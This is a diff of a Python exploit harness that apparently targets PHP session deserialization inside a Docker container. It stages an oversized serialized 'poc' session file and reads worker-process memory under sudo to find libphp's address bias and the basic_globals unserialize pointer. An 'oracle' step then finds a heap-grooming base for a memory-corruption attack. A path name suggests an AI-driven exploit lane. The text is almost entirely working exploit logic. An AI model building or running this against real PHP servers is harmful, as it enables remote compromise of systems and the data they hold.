@@ -91,14 +91,14 @@ def stage(sid, data):
 def stage_big(sid):
     sh(["docker", "exec", CTNR, "sh", "-c",
         '{ printf %s \'poc|a:2:{i:0;s:3:"abc";i:1;s:72000000:"\'; '
-        'head -c 72000000 /dev/zero | tr "\\0" A; printf %s \'"}\'; } '
+        'head -c 72000000 /dev/zero | tr "\\0" A; printf %s \'";}\'; } '
         f"> /tmp/sess_{sid}; chown www-data:www-data /tmp/sess_{sid}; "
         f"chmod 600 /tmp/sess_{sid}"])
 
 
 def dump_windows(cpid, addr, n):
     out = {}
-    for line in memtool(["dump-all", str(cpid), hex(addr), str(n)]).splitlines():
+    for line in memtool("dump-all", str(cpid), hex(addr), str(n)).splitlines():
         pid, hx = line.split()
         out[int(pid)] = bytes.fromhex(hx)
     return out
@@ -107,9 +107,7 @@ def dump_windows(cpid, addr, n):
 def main():
     tag = sys.argv[2] if len(sys.argv) > 2 else "r1"
     cpid = sh(["docker", "inspect", "-f", "{{.State.Pid}}", CTNR])
-    bias = int(memtool(["libphp-bias", cpid, "53"]) if False else
-               sh(["sudo", "python3", "lanes/race-618/glm4/memtool.py",
-                   "libphp-bias", cpid, "53"]), 16)
+    bias = int(memtool("libphp-bias", cpid, "53"), 16)
     bg = bias + BG_VA
     log(f"=== round {tag}: cpid={cpid} bias={bias:#x} basic_globals={bg:#x}")
     base = dump_windows(cpid, bg, BG_LEN)
@@ -133,19 +131,20 @@ def main():
     log("producer body: " + body[:200].decode("utf8", "replace").replace("\n", " "))
 
     post = dump_windows(cpid, bg, BG_LEN)
-    changed = []
+    hit = None
     for pid, hx in post.items():
         b0 = base.get(pid)
-        if b0 and b0 != hx:
-            for i in range(0, BG_LEN - 8, 8):
-                if b0[i:i+8] != hx[i:i+8]:
-                    v = struct.unpack_from("<Q", hx, i)[0]
-                    if v:
-                        changed.append((pid, bg + i, v))
-    if len(changed) != 1:
-        log(f"ORACLE: expected exactly 1 changed qword, got {changed}")
+        if not b0 or b0 == hx:
+            continue
+        for i in range(0, BG_LEN - 16, 8):
+            v = struct.unpack_from("<Q", hx, i)[0]
+            lv = struct.unpack_from("<Q", hx, i + 8)[0]
+            if b0[i:i+16] != hx[i:i+16] and lv == 1 and v > 0x1000000:
+                hit = (pid, bg + i, v)
+    if not hit:
+        log("ORACLE: no {data-ptr, level=1} pair found in basic_globals")
         raise SystemExit("oracle failed")
-    cpid_child, bg_data, groom_base = changed[0]
+    cpid_child, bg_data, groom_base = hit
     log(f"ORACLE: child={cpid_child} &BG(unserialize).data={bg_data:#x} "
         f"d_chunk={groom_base:#x}")
 
